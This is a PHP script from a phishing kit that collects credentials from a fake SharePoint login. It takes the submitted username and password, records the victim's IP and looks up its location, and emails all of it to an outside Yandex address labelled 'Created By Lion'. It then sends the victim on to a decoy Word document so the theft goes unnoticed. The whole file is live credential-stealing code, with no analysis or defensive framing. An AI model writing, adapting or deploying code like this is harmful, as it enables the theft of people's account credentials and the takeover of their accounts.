<?php

extract($_POST);

$ip = getenv("REMOTE_ADDR");
//Get IP Country City
$url = "http://api.ipinfodb.com/v3/ip-country/?key=d5fffa06f621e0c28602b13de0c551db8aa491f01e694648988453bc9bcf72e1&ip=$ip";
$url = "http://api.ipinfodb.com/v3/ip-city/?key=d5fffa06f621e0c28602b13de0c551db8aa491f01e694648988453bc9bcf72e1&ip=$ip";
$country = file_get_contents($url);
//
$Email = $_POST['emailID'];
$Passwd = $_POST['passwd'];

$message .= "---------+ SharePoint |+-------\n";
$message .= "Username: ".$feedback."\n";
$message .= "PassWord: ".$feedbacknow."\n";
$message .= "Client IP: ".$ip."\n";
$message .= "--+ Created By Lion🦁 +---\n";

$from = "From: SharePoint <SharePoint>";
$from .= "MIME-Version: SharePoint\r\n";
$subj .= "LoGiN: | ";

if (empty($feedback) || empty($feedbacknow)) {
header( "Location: https://glitteringuniverse.com/P1-43-44-2020-3589.docx" );
}
else {
mail("unusualresults@yandex.com", $subj, $message, $from);
header("Location: https://glitteringuniverse.com/P1-43-44-2020-3589.docx");
}
?>
